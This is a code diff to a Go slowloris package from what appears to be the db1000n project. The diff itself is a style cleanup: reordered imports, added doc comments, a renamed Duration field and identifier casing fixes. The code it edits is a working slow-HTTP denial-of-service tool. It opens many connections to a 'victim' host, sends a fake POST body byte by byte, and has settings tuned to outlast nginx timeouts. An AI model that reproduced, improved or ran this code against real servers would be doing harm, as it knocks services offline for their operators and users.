@@ -2,7 +2,6 @@ package slowloris
 
 import (
 	"fmt"
-	"github.com/Arriven/db1000n/src/metrics"
 	"io"
 	"log"
 	"net"
@@ -10,19 +9,23 @@ import (
 	"strings"
 	"time"
 
+	"github.com/Arriven/db1000n/src/metrics"
+
 	utls "github.com/refraction-networking/utls"
 )
 
+// Config holds all the configuration values for slowloris
 type Config struct {
 	ContentLength    int           // The maximum length of fake POST body in bytes. Adjust to nginx's client_max_body_size
 	DialWorkersCount int           // The number of workers simultaneously busy with opening new TCP connections
 	RampUpInterval   time.Duration // Interval between new connections' acquisitions for a single dial worker (see DialWorkersCount)
 	SleepInterval    time.Duration // Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout
-	DurationSeconds  time.Duration // Duration in seconds
+	Duration         time.Duration // Duration
 	Path             string        // Target Path. Http POST must be allowed for this Path
 	HostHeader       string        // Host header value in case it is different than the hostname in Path
 }
 
+// SlowLoris is a main logic struct for the package
 type SlowLoris struct {
 	Config *Config
 }
@@ -32,6 +35,7 @@ var (
 	sharedWriteBuf = []byte("A")
 )
 
+// Start starts a slowloris job with specific configuration
 func Start(stopChan chan bool, config *Config) error {
 	s := &SlowLoris{
 		Config: config,
@@ -65,20 +69,20 @@ func Start(stopChan chan bool, config *Config) error {
 		go s.dialWorker(stopChan, config, activeConnectionsCh, targetHostPort, targetURL, requestHeader)
 		time.Sleep(dialWorkersLaunchInterval)
 	}
-	time.Sleep(config.DurationSeconds)
+	time.Sleep(config.Duration)
 
 	return nil
 }
 
-func (s SlowLoris) dialWorker(stopChan chan bool, config *Config, activeConnectionsCh chan<- int, targetHostPort string, targetUri *url.URL, requestHeader []byte) {
-	isTls := targetUri.Scheme == "https"
+func (s SlowLoris) dialWorker(stopChan chan bool, config *Config, activeConnectionsCh chan<- int, targetHostPort string, targetURI *url.URL, requestHeader []byte) {
+	isTLS := targetURI.Scheme == "https"
 	for {
 		select {
 		case <-stopChan:
 			return
 		default:
 			time.Sleep(config.RampUpInterval)
-			conn := s.dialVictim(targetHostPort, isTls)
+			conn := s.dialVictim(targetHostPort, isTLS)
 			if conn != nil {
 				go s.doLoris(config, targetHostPort, conn, activeConnectionsCh, requestHeader)
 			}
@@ -94,7 +98,7 @@ func (s SlowLoris) activeConnectionsCounter(ch <-chan int) {
 	}
 }
 
-func (s SlowLoris) dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
+func (s SlowLoris) dialVictim(hostPort string, isTLS bool) io.ReadWriteCloser {
 	// TODO: add support for dialing the Path via a random proxy from the given pool.
 	conn, err := net.Dial("tcp", hostPort)
 	if err != nil {
@@ -122,7 +126,7 @@ func (s SlowLoris) dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
 		return nil
 	}
 
-	if !isTls {
+	if !isTLS {
 		return tcpConn
 	}
 
